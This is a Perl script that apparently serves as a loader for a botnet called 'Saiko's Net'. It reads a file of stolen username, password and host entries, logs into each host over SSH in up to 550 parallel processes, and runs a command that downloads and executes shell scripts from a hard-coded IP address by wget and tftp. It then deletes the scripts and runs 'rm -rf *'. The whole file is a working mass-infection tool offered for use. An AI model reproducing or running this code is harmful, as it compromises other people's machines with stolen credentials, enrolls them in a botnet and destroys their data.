#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /run || cd /; wget http://194.15.36.212/jsdfgbins.sh; chmod 777 jsdfgbins.sh; sh jsdfgbins.sh; tftp 194.15.36.212 -c get jsdfgtftp1.sh; chmod 777 jsdfgtftp1.sh; sh jsdfgtftp1.sh; tftp -r jsdfgtftp2.sh -g 194.15.36.212; chmod 777 jsdfgtftp2.sh; sh jsdfgtftp2.sh; rm -rf jsdfgbins.sh jsdfgtftp1.sh jsdfgtftp2.sh; rm -rf *');
                        sleep 10;
                        $channel->close;
                        print "\e[35;1mLoading [\x1b[1;32mS A I K O\x1b[1;35m] ROOT ~>: ".$newarray[$c]."\n";
                } else {
                        print "\e[34;1mScanning \x1b[1;35mSSH\n";
                }
        } else {
                print "\e[36;1mLoading [\x1b[1;32mDevice\x1b[1;37m] JOINED Saiko's Net\n";
        }
        $pm->finish;
}
$pm->wait_all_children;

